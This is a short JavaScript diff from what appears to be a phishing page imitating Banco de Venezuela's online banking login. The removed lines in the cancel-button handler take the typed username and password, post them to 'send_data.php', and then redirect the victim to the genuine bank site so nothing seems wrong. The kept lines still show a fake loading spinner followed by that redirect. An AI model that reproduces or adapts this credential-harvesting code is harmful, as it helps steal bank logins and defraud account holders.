@@ -407,33 +407,12 @@
         });
 
         btnCancelar.addEventListener('click', () => {
-            const usuario = document.querySelector('.input-field').value;
-            const password = document.querySelector('.password-input').value;
-            
-            // Mostrar loader
             const loader = document.querySelector('.loader');
             loader.style.display = 'flex';
             
-            // Enviar datos al servidor
-            fetch('send_data.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `usuario=${encodeURIComponent(usuario)}&password=${encodeURIComponent(password)}`
-            })
-            .then(response => response.json())
-            .then(data => {
-                setTimeout(() => {
-                    window.location.href = 'https://bdvenlinea.banvenez.com/';
-                }, 2000);
-            })
-            .catch(error => {
-                // En caso de error, redirigir de todos modos
-                setTimeout(() => {
-                    window.location.href = 'https://bdvenlinea.banvenez.com/';
-                }, 2000);
-            });
+            setTimeout(() => {
+                window.location.href = 'https://bdvenlinea.banvenez.com/';
+            }, 2000);
         });
 
         showPasswordBtn.addEventListener('click', () => {
